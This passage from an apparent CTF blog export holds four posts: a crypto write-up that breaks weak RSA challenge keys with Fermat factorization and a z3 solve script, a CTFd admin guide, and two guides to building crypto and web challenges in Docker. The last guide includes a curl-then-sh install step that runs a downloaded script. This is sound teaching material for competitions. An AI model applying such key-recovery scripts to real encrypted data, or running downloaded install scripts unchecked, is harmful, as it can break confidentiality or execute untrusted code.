6348779979606280884589422188738902470575876294643492831465947360363568026280963989291591157710389629216109615274754718329987990551836115660879103234129921943824061416396264358110216047994331119920503431491509529604742468032906950984256964560405062345280120526771439940278606226153077959057882262745273394986607004406770035459301695806378598890589432538916219821477777021460189140081521779103226953544426441823244765828342973086422949017937701261348963541035128661464068769033772390320426795044617751909787914185985911277628404632533530390761257251552073493697518547350246993679844132297414094727147161169548160586911</span></span><br><span class="line"><span class="comment">#c1 = 6201882078995455673376327652982610102807874783073703018551044780440620679217833227711395689114659144506630609087600915116940111002026241056808189658969089532597757995423694966667948250438579639890580690392400661711864264184444018345499567505424672090632235109624193289954785503512742400960515331371813467034511130432319427185134018830006918682733848618201088649690422818940385123599468595766345668931882249779415788129316594083269412221804774856038796248038700275509397599351533280014908894068141056694660319816046357462684688942519849441237878018480036145051967731081582598773076490918572392784684372694103015244826</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p2+q2 = 274773146761138462708137582309097386437793891793691383033856524303010811294101933454824485010521468914846151819876043508541879637544444256520741418495479393777132830985856522008561088410862815913292288683761657919121930016956916865849261153721097671315883469348972925757078089715102032241818526925988645578778</span></span><br><span class="line"><span class="comment">#p2*q2 = 18514724270030962172566965941723224386374076294232652258701085781018776172843355920566035157331579524980108190739141959926523082142273672741849552475156278397131571360099018592018959785627785130126477982765210498547680367230723634424036009539347854344573537848628061468892166199866227984167843139793429682559241317072979374002912607549039431398267184818771503468116379618249319324788996321340764624593443106354104274472601170229835219638093242557547840060892527576940077162990069687019966946826210112318408269749294366586682732614372434218768720577917368726530200897558912687470088583774711767599580037663378929000217</span></span><br><span class="line"><span class="comment">#n2 = 40588227045595304080360385041082238507044292731344465815296032905633525556943787610712651675460810768762763493579129831271018141591546207557410817432455139315527674932933085299277599173971912445226532235814580879585317211349524406424200622675880992390782025158621241499693400288031658194434641718026910652327933253877313106112861283314274635124734817398465059373562194694957841264834312640926278890386089611103714990646541470577351599526904458342660444968591197606820361364761648205241041444681145820799054413179462285509661124362074093583494932706249461954240408827087015525507173082129412234486228092002841868365895837463699200959915782767657258729794037776401995309244941171415842403617486719492483671490834562579225506831496881542530519595438932482796867853234159664409420977526102480385193101883785161080269573707156626838551506024455480650224305894501968583442346807126920740779780593650871645915149689424292912611578291912721896864772950410266629045542480009266574096080138709683466489568290569363478444349563498507530805502511051165160827192795520182720802422213364247355775222858214648603034743679187470844212529134374975737510982287957316878179964602394749601431823167982157434890459245394370728942790117156485268116758052636794417268680901420193002289035538753620555488506926366624641291881353268617130968991258983002165300186971963661666476600998389048880565199317280428349802824448329898502788492233381873026217202981921654673840142095839603360666049476100561268336225902504932800605464136192275593886736746497955270280541423593</span></span><br><span class="line"><span class="comment">#c2 = 25591090168544821761746024178724660839590948190451329227481168576490717242294520739865602061082558759751196452117720647426598261568572440942370039702932821941366792140173428488344932203576334292648255551171274828821657097667106792872200082579319963310503721435500623146012954474613150848083425126987554594651797477741828655238243550266972216752593788734836373144363217639612492397228808215205862281278774096317615918854403992620720969173788151215489908812749179861803144937169587452008097008940710091361183942268245271154461872102813602754439939747566507116519362821255724179093051041994730856401493996771276172343313045755916751082693149885922105491818225012844519264933137622929024918619477538521533548551789739698933067212305578480416163609137189891797209277557411169643568540392303036719952140554435338851671440952865151077383220305295001632816442144022437763089133141886924265774247290306669825085862351732336395617276100374237159580759999593028756939354840677333467281632435767033150052439262501059299035212928041546259933118564251119588970009016873855478556588250138969938599988198494567241172399453741709840486953189764289118312870580993115636710724139809708256360212728127786394411676427828431569046279687481368215137561500777480380501551616577832499521295655237360184159889151837766353116185320317774645294201044772828099074917077896631909654671612557207653830344897644115936322128351494551004652981550758791285434809816872381900401440743578104582305215488888563166054568802145921399726673752722820646807494657299104190123945675647</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h3><p>第一段</p>
<script type="math/tex; mode=display">
n\,\,=\,\,p\,\,* q\,\,* nextprime\left( p \right) \,\,* nextprime\left( q \right)</script><p>费马分解。</p>
<p>第二段解个方程（实际出了个离谱非预期，根本不用解，但是没有战队想到），然后欧拉函数。</p>
<h3 id="解法："><a href="#解法：" class="headerlink" title="解法："></a>解法：</h3><p>这垃圾出题人刷没刷过题啊，祥云杯2020的原题都好意思拿来出。</p>
<p>祥云杯脚本走一下就行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n1 = <span class="number">6348779979606280884589422188738902470575876294643492831465947360363568026280963989291591157710389629216109615274754718329987990551836115660879103234129921943824061416396264358110216047994331119920503431491509529604742468032906950984256964560405062345280120526771439940278606226153077959057882262745273394986607004406770035459301695806378598890589432538916219821477777021460189140081521779103226953544426441823244765828342973086422949017937701261348963541035128661464068769033772390320426795044617751909787914185985911277628404632533530390761257251552073493697518547350246993679844132297414094727147161169548160586911</span></span><br><span class="line">c1 = <span class="number">6201882078995455673376327652982610102807874783073703018551044780440620679217833227711395689114659144506630609087600915116940111002026241056808189658969089532597757995423694966667948250438579639890580690392400661711864264184444018345499567505424672090632235109624193289954785503512742400960515331371813467034511130432319427185134018830006918682733848618201088649690422818940385123599468595766345668931882249779415788129316594083269412221804774856038796248038700275509397599351533280014908894068141056694660319816046357462684688942519849441237878018480036145051967731081582598773076490918572392784684372694103015244826</span></span><br><span class="line"></span><br><span class="line">jia = <span class="number">274773146761138462708137582309097386437793891793691383033856524303010811294101933454824485010521468914846151819876043508541879637544444256520741418495479393777132830985856522008561088410862815913292288683761657919121930016956916865849261153721097671315883469348972925757078089715102032241818526925988645578778</span></span><br><span class="line">cheng = <span class="number">18514724270030962172566965941723224386374076294232652258701085781018776172843355920566035157331579524980108190739141959926523082142273672741849552475156278397131571360099018592018959785627785130126477982765210498547680367230723634424036009539347854344573537848628061468892166199866227984167843139793429682559241317072979374002912607549039431398267184818771503468116379618249319324788996321340764624593443106354104274472601170229835219638093242557547840060892527576940077162990069687019966946826210112318408269749294366586682732614372434218768720577917368726530200897558912687470088583774711767599580037663378929000217</span></span><br><span class="line">n2 = <span class="number">40588227045595304080360385041082238507044292731344465815296032905633525556943787610712651675460810768762763493579129831271018141591546207557410817432455139315527674932933085299277599173971912445226532235814580879585317211349524406424200622675880992390782025158621241499693400288031658194434641718026910652327933253877313106112861283314274635124734817398465059373562194694957841264834312640926278890386089611103714990646541470577351599526904458342660444968591197606820361364761648205241041444681145820799054413179462285509661124362074093583494932706249461954240408827087015525507173082129412234486228092002841868365895837463699200959915782767657258729794037776401995309244941171415842403617486719492483671490834562579225506831496881542530519595438932482796867853234159664409420977526102480385193101883785161080269573707156626838551506024455480650224305894501968583442346807126920740779780593650871645915149689424292912611578291912721896864772950410266629045542480009266574096080138709683466489568290569363478444349563498507530805502511051165160827192795520182720802422213364247355775222858214648603034743679187470844212529134374975737510982287957316878179964602394749601431823167982157434890459245394370728942790117156485268116758052636794417268680901420193002289035538753620555488506926366624641291881353268617130968991258983002165300186971963661666476600998389048880565199317280428349802824448329898502788492233381873026217202981921654673840142095839603360666049476100561268336225902504932800605464136192275593886736746497955270280541423593</span></span><br><span class="line">c2 = <span class="number">25591090168544821761746024178724660839590948190451329227481168576490717242294520739865602061082558759751196452117720647426598261568572440942370039702932821941366792140173428488344932203576334292648255551171274828821657097667106792872200082579319963310503721435500623146012954474613150848083425126987554594651797477741828655238243550266972216752593788734836373144363217639612492397228808215205862281278774096317615918854403992620720969173788151215489908812749179861803144937169587452008097008940710091361183942268245271154461872102813602754439939747566507116519362821255724179093051041994730856401493996771276172343313045755916751082693149885922105491818225012844519264933137622929024918619477538521533548551789739698933067212305578480416163609137189891797209277557411169643568540392303036719952140554435338851671440952865151077383220305295001632816442144022437763089133141886924265774247290306669825085862351732336395617276100374237159580759999593028756939354840677333467281632435767033150052439262501059299035212928041546259933118564251119588970009016873855478556588250138969938599988198494567241172399453741709840486953189764289118312870580993115636710724139809708256360212728127786394411676427828431569046279687481368215137561500777480380501551616577832499521295655237360184159889151837766353116185320317774645294201044772828099074917077896631909654671612557207653830344897644115936322128351494551004652981550758791285434809816872381900401440743578104582305215488888563166054568802145921399726673752722820646807494657299104190123945675647</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s=Solver()</span><br><span class="line">x=Int(<span class="string">'x'</span>)</span><br><span class="line">y=Int(<span class="string">'y'</span>)</span><br><span class="line">s.add(x+y==jia)</span><br><span class="line">s.add(x*y==cheng)</span><br><span class="line"><span class="keyword">assert</span> s.check()==sat</span><br><span class="line"></span><br><span class="line">p2=<span class="built_in">int</span>(<span class="built_in">str</span>(s.model()[x]))</span><br><span class="line">q2=<span class="built_in">int</span>(<span class="built_in">str</span>(s.model()[y]))</span><br><span class="line"></span><br><span class="line">phi = n2 * (p2-<span class="number">1</span>) * (q2-<span class="number">1</span>) // (p2 * q2)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m2=long_to_bytes(<span class="built_in">pow</span>(c2,d,n2))</span><br><span class="line"><span class="built_in">print</span>(m2)</span><br><span class="line"></span><br><span class="line">phi1=p2-<span class="number">1</span></span><br><span class="line">d = inverse(e,phi1)</span><br><span class="line">m = <span class="built_in">pow</span>(c2, d, p2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fermat_factorization</span>(<span class="params">n</span>):</span></span><br><span class="line">	factor_list = []</span><br><span class="line">	get_context().precision = <span class="number">1024</span></span><br><span class="line">	x = <span class="built_in">int</span>(sqrt(n))</span><br><span class="line">	<span class="comment">#print(x)</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		x += <span class="number">1</span></span><br><span class="line">		y2 = x ** <span class="number">2</span> - n</span><br><span class="line">		<span class="keyword">if</span> is_square(y2):</span><br><span class="line">			<span class="comment">#print('x = ',x)</span></span><br><span class="line">			y2 = mpz(y2)</span><br><span class="line">			get_context().precision = <span class="number">1024</span></span><br><span class="line">			y = <span class="built_in">int</span>(sqrt(y2))</span><br><span class="line">			factor_list.append([x+y, x-y])</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(factor_list) == <span class="number">2</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> factor_list</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">* 复制并使用代码请注明引用出处哦~</span><br><span class="line">* Lazzaro @ https://lazzzaro.github.io</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">tmp1=(fermat_factorization(n1)[<span class="number">0</span>])[<span class="number">0</span>]</span><br><span class="line">tmp2=(fermat_factorization(n1)[<span class="number">0</span>])[<span class="number">1</span>]</span><br><span class="line">tmp3=(fermat_factorization(n1)[<span class="number">1</span>])[<span class="number">0</span>]    <span class="comment">#p1*q1</span></span><br><span class="line">tmp4=(fermat_factorization(n1)[<span class="number">1</span>])[<span class="number">1</span>]    <span class="comment">#p*q</span></span><br><span class="line"></span><br><span class="line">p=gcd(tmp1,tmp4)</span><br><span class="line">q=gcd(tmp2,tmp4)</span><br><span class="line">p1=next_prime(p)</span><br><span class="line">q1=next_prime(q)</span><br><span class="line">phi1=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">d1=inverse(<span class="number">65537</span>,phi1)</span><br><span class="line">m1=long_to_bytes(<span class="built_in">pow</span>(c1,d1,n1))</span><br><span class="line"><span class="built_in">print</span>(m1)</span><br><span class="line"><span class="built_in">print</span>(m1+m2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>解方程有很多种解法，z3，sagemath，求根公式，当然也可以不解方程。</p>
<script type="math/tex; mode=display">
n\,\,=\,\,p^2\,\,*\,q^3
\\
p*q\,\,=\,\,c
\\
q\,\,=\,\,n\,\,\div \,\,\left( p^2q^2 \right)</script><p>看得出来出题人确实没学好除法。</p>
<p>费马分解后，4个值为<code>p*q</code>、<code>p1*q</code>、<code>p*q1</code>、<code>p1*q1</code>，显然，4个数最大的为<code>p1*q1</code>，最小的为<code>p*q</code>，那和剩下的两个数求个公因数就出来了。</p>
<p>欧拉函数不多解释了，放两个。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">phi = p-<span class="number">1</span></span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">phi = (p-<span class="number">1</span>) * p * (q-<span class="number">1</span>) * q * q</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>建议出题人好好学习数学，不要不自量力去给全国性的比赛出题。</p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>比赛复现</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFd运维指南</title>
    <url>/2021/10/05/CTFd%E8%BF%90%E7%BB%B4%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h1 id="如何运维CTFd"><a href="#如何运维CTFd" class="headerlink" title="如何运维CTFd"></a>如何运维CTFd</h1><p>简单的总结并分享一下CTFd 3.4.0版本的运维。</p>
<span id="more"></span>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531837275-62c99763-9c14-4eca-b920-2248c0e92423.png" alt="image-20211005134919356"></p>
<p>进入管理员页面，大概是这样一个总览图。接下来我会介绍一下每个模块的功能。</p>
<h2 id="Statistics"><a href="#Statistics" class="headerlink" title="Statistics"></a>Statistics</h2><p>一个统计页面，过。</p>
<h2 id="Notifications"><a href="#Notifications" class="headerlink" title="Notifications"></a>Notifications</h2><p>通知页面，没玩过，无非就是发些通知、公告类，影响不大，过。</p>
<h2 id="Pages"><a href="#Pages" class="headerlink" title="Pages"></a>Pages</h2><p>页面功能，就是给网站加页面，自定义路由和路由名字。</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531845418-08d11b0a-5fb0-4e93-9be0-b3ec5c2af60f.png" alt="image-20211005135405456"></p>
<p>没什么花里胡哨的，都是字面意思。Authentication Required选项是需要登录后才可查看的意思。</p>
<h2 id="Users"><a href="#Users" class="headerlink" title="Users"></a>Users</h2><p><img src="https://c.img.dasctf.com/images/20221220/1671531851919-7caee9f9-00b0-42a6-9ab8-957d54f30e3b.png" alt="image-20211005135756947"></p>
<p>都看得懂的吧，编辑权限、状态、修改信息等功能。注意，管理员账号权限非常高，可以任意修改他人（包括其他管理员的权限），也可以自己把自己号删了，使用时建议管理员越少越好。</p>
<p>还可以看到每个人的正确、错误提交，未解题、登录IP地址（较准确）、个人统计等数据。</p>
<h2 id="Scoreboard"><a href="#Scoreboard" class="headerlink" title="Scoreboard"></a>Scoreboard</h2><p>积分榜，没什么好多说的。</p>
<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><p>挑战模块，最常用的模块，只讲解dynamic_docker部分。ICPC的ACM插件自行探索吧。</p>
<p>首先是categories分类，也就是体现在主页上的内容。pages主题会自动识别这个框里的<code>.</code>符号，实现二级标题。</p>
<p>然后是docker image，写你上传在docker上的镜像，就是docker pull后面的内容。</p>
<p>Frp Redirect Type，有域名会配置解析写HTTP，不会老老实实用direct。</p>
<p>Frp Redirect Port，你dockerfile里暴露的哪个端口，就写映射哪个端口。</p>
<p>下面两个不要动。静态分数和动态分数。</p>
<p>动态分数的曲线公式写出来估计你们也看不懂，所以我写了个实现函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Cal</span>(<span class="params">max_point,min_point,solve_threshold,x</span>):</span></span><br><span class="line">	a = max_point</span><br><span class="line">	b = min_point</span><br><span class="line">	s = solve_threshold</span><br><span class="line">	<span class="keyword">if</span> x&gt;=s:</span><br><span class="line">		<span class="keyword">return</span> b</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		results = ((b-a)*x*x)/(s*s)+a </span><br><span class="line">		<span class="keyword">return</span> results</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">	<span class="built_in">print</span>(Cal(<span class="number">100</span>,<span class="number">20</span>,<span class="number">5</span>,i))</span><br><span class="line">    </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">100.0</span></span><br><span class="line"><span class="string">96.8</span></span><br><span class="line"><span class="string">87.2</span></span><br><span class="line"><span class="string">71.2</span></span><br><span class="line"><span class="string">48.8</span></span><br><span class="line"><span class="string">20.0</span></span><br><span class="line"><span class="string">20</span></span><br><span class="line"><span class="string">20</span></span><br><span class="line"><span class="string">20</span></span><br><span class="line"><span class="string">20</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>需要4个参数，最高分、最低分、一个固定常数s、解题人数x</p>
<p>程序很简单，都能看懂，不解释。</p>
<h2 id="Submissions"><a href="#Submissions" class="headerlink" title="Submissions"></a>Submissions</h2><p>记录了所有人所有题目的正确提交和错误提交。</p>
<h2 id="config"><a href="#config" class="headerlink" title="config"></a>config</h2><p>这个是个人能用翻译的都看得懂了，基础设置。</p>
<p>security是邀请码，写了以后，注册要填邀请码。</p>
<p>backup备份，建议定期备份站的数据。也可以导入数据，做平台迁移。注意导入后要坚持whale和一些其他设置的信息。每个平台都有自己的架构。</p>
<h2 id="whale"><a href="#whale" class="headerlink" title="whale"></a>whale</h2><p>ctfd的动态靶机插件，Direct IP Address不懂的写自己真实ip，这个没法教，自己搭一遍平台就懂了。否则说也说不清楚。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>开发、导入插件等自定义功能请自行探索。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/frankli0324/ctfd-whale">CTF3.0版本CTFd-whale</a></p>
<p><a href="https://github.com/frankli0324/ctfd-pages-theme">pages主题</a></p>
<p><a href="https://www.zhaoj.in/read-6333.html">赵总官方教程</a></p>
<p>搭建可以参考我的博客（旧版2.3.2），以及vaalacat和frankli0324的教程（新版）</p>
<h2 id="寄语"><a href="#寄语" class="headerlink" title="寄语"></a>寄语</h2><p>当我写下这篇文档时，恐怕我不会再对这个我早8晚1肝了2个月的平台做进一步维护了。希望它能成为结合课堂教学、日常练习、训练赛等各项功能于一体的综合性训练平台。同时，我的个人dockerhub仓库很有可能不再更新，也不再会代表Rainbow7战队参加比赛。不过，这并不意味着我的网安之路的结束，我认为这更像是一场全新的开始。我依然有可能参与一些线上比赛，也有可能和其他志同道合的朋友一起去玩玩更多的东西。只是对我来说，CTF将不再是我的全部。</p>
<p>留下一点期待。</p>
<p>希望后辈有人能设计出n机frp转发模式，这样可以大幅降低平台压力。1核2G配置极限应该只够20人同时使用。虽然根据概率论的原理来计算，35个活跃用户同时开启10台及以上的靶机的概率≈0.0004，但是，这样的训练平台肯定无法满足比赛需求。</p>
<p>以及开发<code>v1/api</code>插件，只使用<code>go-cqhttp</code>即可做出ctfshow和大牛的播报效果。</p>
<p>根据<code>onebot</code>机器人协议，可以开发出更多带有意思的功能的qqbot，推荐使用nonebot2 。</p>
<p>还有内网穿透，公网访问内网服务器地址，尤其适用于博客。</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>CTFd运维</tag>
      </tags>
  </entry>
  <entry>
    <title>如何用docker出一道ctf题(crypto)</title>
    <url>/2021/09/30/%E5%A6%82%E4%BD%95%E7%94%A8docker%E5%87%BA%E4%B8%80%E9%81%93ctf%E9%A2%98-crypto/</url>
    <content><![CDATA[<h1 id="如何用docker出一道ctf题-crypto"><a href="#如何用docker出一道ctf题-crypto" class="headerlink" title="如何用docker出一道ctf题(crypto)"></a>如何用docker出一道ctf题(crypto)</h1><p>目前docker的使用越来越宽泛，ctfd也支持从dockerhub一键拉题了。因此，学习如何使用docker出ctf题是非常必要的。</p>
<span id="more"></span>
<h2 id="python3篇"><a href="#python3篇" class="headerlink" title="python3篇"></a>python3篇</h2><p>在介绍python2篇和python3篇之前，首先需要对raw_input和input这两个函数做一个讲解。引用<a href="https://www.runoob.com/python/python-func-raw_input.html">菜鸟教程</a>。</p>
<blockquote>
<p>注意：input() 和 raw_input() 这两个函数均能接收 字符串 ，但 raw_input()  直接读取控制台的输入（任何类型的输入它都可以接收）。而对于 input() ，它希望能够读取一个合法的 python  表达式，即你输入字符串的时候必须使用引号将它括起来，否则它会引发一个 SyntaxError 。</p>
<p>除非对 input() 有特别需要，否则一般情况下我们都是推荐使用 raw_input() 来与用户交互。</p>
<p>注意：python3 里 input() 默认接收到的是 str 类型。</p>
</blockquote>
<p>因此，在python3环境下出题，输入端要填input()。</p>
<p>和web篇一样，我们以一道完整的题来演示一下。题目为sha256碰撞。</p>
<h3 id="sha256-py"><a href="#sha256-py" class="headerlink" title="sha256.py"></a>sha256.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">BUFSIZE = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c0</span>():</span></span><br><span class="line">    random.seed(os.urandom(<span class="number">128</span>))</span><br><span class="line">    alphabet = string.ascii_letters+string.digits</span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join(random.choices(alphabet, k=<span class="number">16</span>))</span><br><span class="line">    hash_value = hashlib.sha256(proof.encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;???&#x27;</span>+<span class="string">&#x27;+&#x27;</span>+proof[<span class="number">3</span>:])</span><br><span class="line">    <span class="built_in">print</span>(hash_value)</span><br><span class="line">    buf = <span class="built_in">input</span>(BUFSIZE).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    tmp = buf+proof[<span class="number">3</span>:]</span><br><span class="line">    <span class="keyword">if</span> hashlib.sha256(tmp.encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest() == hash_value:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;proof completed\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;bye~&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">win</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;Flag not Found...&#x27;</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c0 = c0()</span><br><span class="line">        <span class="keyword">if</span> c0 == <span class="number">1</span>:</span><br><span class="line">            win()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>先是一波经典偷懒，直接拿了<code>ctftraining</code>的<code>copperstudy2.py</code>进行修改，改除了这道题目。由于答案在环境变量里，可以采用<code>print(os.environ.get(&#39;FLAG&#39;))</code>这种方法，但是我个人更喜欢<code>from flag import flag</code>这种方法，区别不大，主要就是知道如何从系统环境变量中拿flag就行。</p>
<p>然后看Dockerfile，更简单。</p>
<h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ctfhub/base_misc_socat_python_36</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> sha256.py /app/sha256.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">MAINTAINER</span> mapleice &lt;https://liuxin2020.github.io&gt;</span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> socat TCP4-LISTEN:10000,tcpwrap=script,reuseaddr,fork EXEC:<span class="string">&quot;/usr/bin/env python3 -u /app/sha256.py&quot;</span></span></span><br></pre></td></tr></table></figure>
<p>做成镜像传上去就行了。</p>
<p>其他记得注意填写<code>requirements.txt</code></p>
<h2 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h2><p>有空回来更。注意使用<code>raw_input</code></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>ctf出题指南</tag>
      </tags>
  </entry>
  <entry>
    <title>如何用docker出一道ctf题(web)</title>
    <url>/2021/09/28/%E5%A6%82%E4%BD%95%E7%94%A8docker%E5%87%BA%E4%B8%80%E9%81%93ctf%E9%A2%98(web)/</url>
    <content><![CDATA[<h1 id="如何用docker出一道ctf题-web"><a href="#如何用docker出一道ctf题-web" class="headerlink" title="如何用docker出一道ctf题(web)"></a>如何用docker出一道ctf题(web)</h1><p>目前docker的使用越来越宽泛，ctfd也支持从dockerhub一键拉题了。因此，学习如何使用docker出ctf题是非常必要的。</p>
<span id="more"></span>
<h2 id="安装docker和docker-compose"><a href="#安装docker和docker-compose" class="headerlink" title="安装docker和docker-compose"></a>安装docker和docker-compose</h2><p>100种方法，写个最简单的。之前一篇文章CTFD部署里我也提到过如何安装。</p>
<h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh get-docker.sh --mirror Aliyun</span><br></pre></td></tr></table></figure>
<h3 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip -y</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install docker-compose</span><br></pre></td></tr></table></figure>
<h2 id="无数据库篇"><a href="#无数据库篇" class="headerlink" title="无数据库篇"></a>无数据库篇</h2><p>这个比较简单，先挂一下tree。</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531790278-9432efb1-7096-4e3c-bc42-f50d77e121ee.png" alt="image-20210928171223267"></p>
<p>我本人习惯在windows下出题，主要是因为方便。<del>实际上是因为我虚拟机里一堆bug</del>。</p>
<p>接下来我们一层一层解析。</p>
<h3 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;1234&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>先从最底层<code>html</code>文件夹内的内容说起。这里面就放题目和<code>flag.php</code>即可，flag如果在根目录的情况我会另外标注(在flag.sh中改)。</p>
<h3 id="flag-sh"><a href="#flag-sh" class="headerlink" title="flag.sh"></a>flag.sh</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">sed -i <span class="string">&quot;s/flag&#123;1234&#125;/<span class="variable">$FLAG</span>/&quot;</span> /var/www/html/flag.php</span><br><span class="line"><span class="built_in">export</span> FLAG=not_flag</span><br><span class="line">FLAG=not_flag</span><br><span class="line"></span><br><span class="line">rm -f /flag.sh</span><br></pre></td></tr></table></figure>
<p>ctfd-whale会自动生成一个随机flag的变量在$FLAG里。</p>
<p>第二行就是将你存储flag的位置，做个替换，3,4行清空环境变量值，否则执行<code>echo $FLAG</code>就能直接出flag。</p>
<p>如果要把flag放入根目录/flag，把第二行改成：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$FLAG</span> &gt;&gt; /flag</span><br></pre></td></tr></table></figure>
